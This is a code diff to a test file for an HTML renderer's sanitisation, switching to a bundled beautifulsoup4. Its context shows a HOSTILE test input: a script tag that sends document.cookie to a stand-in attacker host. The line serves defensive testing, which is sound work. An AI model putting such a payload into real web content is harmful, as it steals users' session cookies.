@@ -8,7 +8,8 @@ formatting from fragments (set_html -> sanitize_fragment), refuses unsafe brand 
 document as HIGH.
 
 Run from the module directory (or the Talent One repository root):
-`python -m pytest -q tests/test_render_safety.py`. Needs beautifulsoup4.
+`python -m pytest -q tests/test_render_safety.py`. Uses the beautifulsoup4 copy bundled
+with the renderer, so it needs only pytest.
 """
 
 from __future__ import annotations
@@ -26,6 +27,8 @@ TEMPLATE = REF / "templates" / "TK_08_Recruiter_Screen.dc.html"
 SCHEMA = REF / "content-schemas" / "TK_08.content-schema.json"
 EXAMPLE = REF / "content-schemas" / "TK_08.example-content.json"
 DS_DIR = REF / "templates" / "_ds" / "onepromptman-ds"
+if str(SKILL_ROOT / "scripts" / "_vendor") not in sys.path:
+    sys.path.insert(0, str(SKILL_ROOT / "scripts" / "_vendor"))
 
 HOSTILE = (
     "<script>fetch('https://attacker.invalid/x?'+document.cookie)</script>"
